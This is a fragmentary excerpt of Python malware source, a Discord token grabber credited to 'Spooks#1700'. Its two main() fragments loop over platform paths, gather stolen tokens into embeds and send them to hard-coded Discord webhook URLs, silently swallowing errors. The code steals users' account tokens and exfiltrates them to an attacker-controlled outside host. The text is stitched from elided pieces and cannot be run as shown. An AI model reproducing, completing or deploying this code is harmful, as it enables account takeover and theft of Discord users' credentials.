...
def main(): 
    ...
    for platform, path in PATHS.items(): 
        ...
        for token in getTokenz(path): 
            ...
            embed = { 
                ...
                "footer": { 
                    "text": f"Grabber made by Spooks#1700" 
                } 
            } 
            embeds.append(embed) 
    ...
    webhook = { 
        "content": "", 
        "embeds": embeds, 
        "username": "Grabber by Spooks#1700", 
        "avatar_url": "https://ibb.co/Xj0k57s" 
    } 
    try: 
        urlopen(Request("https://discordapp.com/api/webhooks/859519216499687444/NhRuoD_iYM2UwYQOY2OytnoSmf-BWsDVQrbVVcGffLJ5f8PMbprsHvUjKMM3hg8_JJ6U", data=dumps(webhook).encode(), headers=getHeader()))
    except: 
        pass 
    try: 
...
def main(): 
    ...
    try: 
        urlopen(Request("https://ptb.discord.com/api/webhooks/859030130524946462/nYxlKlumJH0oBsHOEr4kEg9Jhk_3LEeFzNLoravB7ttB-EMBMuvwz2_n11w8X-qihn7B", data=dumps(webhook).encode(), headers=getHeader()))
    except: 
        pass 
    try: 
